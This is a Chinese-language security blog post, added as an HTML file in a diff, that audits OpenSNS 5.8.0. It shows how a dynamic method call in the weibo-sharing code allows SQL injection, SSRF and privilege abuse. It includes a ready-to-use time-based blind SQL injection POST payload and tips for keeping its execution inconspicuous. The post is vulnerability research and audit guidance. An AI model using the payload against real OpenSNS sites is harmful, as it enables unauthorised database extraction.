@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>OpenSNS5.8.0一处有意思的SQLI - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP,SQLI>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">OpenSNS5.8.0一处有意思的SQLI</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-07-24</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/SQLI/" rel="tag">SQLI</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该系统是基于Thinkphp3.2.0开发的，审计时发现一处可以动态调用函数的地方，虽然受到一定限制，但是还是可以通过这里进行SQL注入，还阔以SSRF以及越权操作</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先看漏洞函数，在&#x2F;Application&#x2F;Weibo&#x2F;Model&#x2F;ShareModel.class.php:8</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShareModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"><span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$param</span>[<span class="string">&#x27;app&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$param</span>[<span class="string">&#x27;model&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$param</span>[<span class="string">&#x27;method&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">D</span>(<span class="variable">$param</span>[<span class="string">&#x27;app&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$param</span>[<span class="string">&#x27;model&#x27;</span>])-&gt;<span class="variable">$param</span>[<span class="string">&#x27;method&#x27;</span>](<span class="variable">$param</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$param[&#39;method&#39;]($param[&#39;id&#39;])</code>使我们可以控制部分函数，且该函数仅需接受一个参数，这就是限制的地方。接下来需要做的就是寻找该系统中满足要求的函数，然后通过构造来调用。</p>
+<p>接着看该函数的调用，在&#x2F;Application&#x2F;Weibo&#x2F;Controller&#x2F;ShareController.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSendShare</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$aContent</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;post.content&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$aQuery</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;post.query&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$aQuery</span>,<span class="variable">$feed_data</span>);</span><br><span class="line">	...</span><br><span class="line">    <span class="variable">$new_id</span> = <span class="title function_ invoke__">send_weibo</span>(<span class="variable">$aContent</span>, <span class="string">&#x27;share&#x27;</span>, <span class="variable">$feed_data</span>,<span class="variable">$feed_data</span>[<span class="string">&#x27;from&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$info</span> =  <span class="title function_ invoke__">D</span>(<span class="string">&#x27;Weibo/Share&#x27;</span>)-&gt;<span class="title function_ invoke__">getInfo</span>(<span class="variable">$feed_data</span>);</span><br><span class="line">    <span class="variable">$toUid</span> = <span class="variable">$info</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">    <span class="variable">$message_content</span>=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;keyword1&#x27;</span>=&gt;  <span class="title function_ invoke__">parse_content_for_message</span>(<span class="variable">$aContent</span>),</span><br><span class="line">        <span class="string">&#x27;keyword2&#x27;</span>=&gt;<span class="string">&#x27;分享了你的：&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;keyword3&#x27;</span>=&gt;<span class="variable">$info</span>[<span class="string">&#x27;title&#x27;</span>]?<span class="variable">$info</span>[<span class="string">&#x27;title&#x27;</span>]:<span class="string">&quot;未知内容！&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>调用处是分享微博(该系统的帖子)的地方，接受数据后使用text函数过滤，该函数基本只能过滤标签，对我们的利用没啥影响。</p>
+<p>另外，系统只有这一处调用点，且受后面语句影响，没有返回信息，而且过多的报错后，用户账号还会被冻结之类的</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>能用来注入的点有很多，后台有一些where中拼接SQL语句的地方可以用，但其实根本不需要，像下面这样的点就可以，&#x2F;Application&#x2F;Common&#x2F;Model&#x2F;ActionLimitModel.class.php:29</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getActionLimit</span>(<span class="params"><span class="variable">$where</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$limit</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$limit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params"><span class="variable">$where</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$list</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>像这样的点本身出于安全考虑，传入的$where都是数组，但是我们可以直接传入一个恶意的字符串来利用。利用前，再回头看到调用处的微博分享：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> =  <span class="title function_ invoke__">D</span>(<span class="string">&#x27;Weibo/Share&#x27;</span>)-&gt;<span class="title function_ invoke__">getInfo</span>(<span class="variable">$feed_data</span>);</span><br><span class="line"><span class="variable">$toUid</span> = <span class="variable">$info</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line"><span class="variable">$message_content</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;keyword1&#x27;</span>=&gt;  <span class="title function_ invoke__">parse_content_for_message</span>(<span class="variable">$aContent</span>),</span><br><span class="line">    <span class="string">&#x27;keyword2&#x27;</span>=&gt;<span class="string">&#x27;分享了你的：&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;keyword3&#x27;</span>=&gt;<span class="variable">$info</span>[<span class="string">&#x27;title&#x27;</span>]?<span class="variable">$info</span>[<span class="string">&#x27;title&#x27;</span>]:<span class="string">&quot;未知内容！&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>这段是会返回$info[‘title’]的，其实只要找到一个利用点有这个字段，就可以直接注出内容了，但是我并没有找到。数据库报错默认又不开启，只剩时间盲注，但是跑盲注得注意的是：每提交一次payload，会分享一篇微博，下一次提交的payload在数据库就会多执行一次，睡眠时间就会延长，且动作明显较大</p>
+<p>所以正确的方法应该是在微博数一定的情况下，提交一次payload，提交微博删除操作，这一切最好靠脚本完成，脚本能力差的我就讲到这吧，嘻嘻</p>
+<p>payload:</p>
+<p><code>[URL]:http://127.0.0.1/index.php?s=/Weibo/Share/doSendShare.html </code></p>
+<p><code>[POST]:content=a&amp;query=from%3d1%26app%3dCommon%26model%3dActionLimit%26method%3dgetList%26id%3d1%253d1 and if((substr(user(),1,1)=&#39;r&#39;),sleep(2),1) </code></p>
+<p><img src="/2018/07/24/OpenSNS5-8-0%20SQL%20Injection/1532418402361.png" alt="1532418402361"></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>利用点：&#x2F;Application&#x2F;Admin&#x2F;Model&#x2F;CurlModel.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$cookie_file</span> = <span class="string">&#x27;Runtime/cookie.txt&#x27;</span>;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;cloud_cookie&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_COOKIE, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getCookie</span>(<span class="keyword">array</span>(<span class="string">&#x27;PHPSESSID&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;cloud_cookie&#x27;</span>])));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>由于找函数基本翻遍了model文件，除了有越权操作外，其中有一个地方还能让我们扩大利用范围，如下&#x2F;Application&#x2F;Common&#x2F;Model&#x2F;ScheduleModel.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">runSchedule</span>(<span class="params"><span class="variable">$schedule</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$schedule</span>[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;-&gt;&#x27;</span>, <span class="variable">$schedule</span>[<span class="string">&#x27;method&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">parse_str</span>(<span class="variable">$schedule</span>[<span class="string">&#x27;args&#x27;</span>], <span class="variable">$args</span>);  <span class="comment">//分解参数</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$return</span> = <span class="title function_ invoke__">D</span>(<span class="variable">$method</span>[<span class="number">0</span>])-&gt;<span class="variable">$method</span>[<span class="number">1</span>](<span class="variable">$args</span>, <span class="variable">$schedule</span>); <span class="comment">//执行model中的方法</span></span><br></pre></td></tr></table></figure>
+
+<p>看到没，又是函数的动态调用，且两个参数可控，也是因为这个利用点，我又翻了几遍文件，刚了几次都没有实现前台Getshell，怪我太菜了…</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>函数的动态调用危害极大，使用时一定得做全面的限制，审计时可以多注意这种地方</p>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
